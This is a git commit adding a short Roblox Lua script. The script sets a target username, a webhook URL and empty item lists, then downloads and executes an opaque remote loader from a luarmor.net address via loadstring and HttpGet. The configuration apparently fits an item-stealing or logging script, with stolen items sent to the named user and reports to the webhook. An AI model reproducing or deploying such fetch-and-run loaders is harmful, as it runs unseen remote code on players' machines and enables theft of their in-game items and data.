2b940643c674d481fc85cb8af02e7c412be1c6e8
sab-api <carlosignaa2019@gmail.com>
2026-09-04 23:49:58 -0400

    Add script a_1788580197911.lua

---
+++ scripts/a_1788580197911.lua
@@ -0,0 +1,10 @@
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "void"
+getgenv().WEBHOOK_URL = "qrqq"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {}
+getgenv().NORMAL_GEARS = {}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
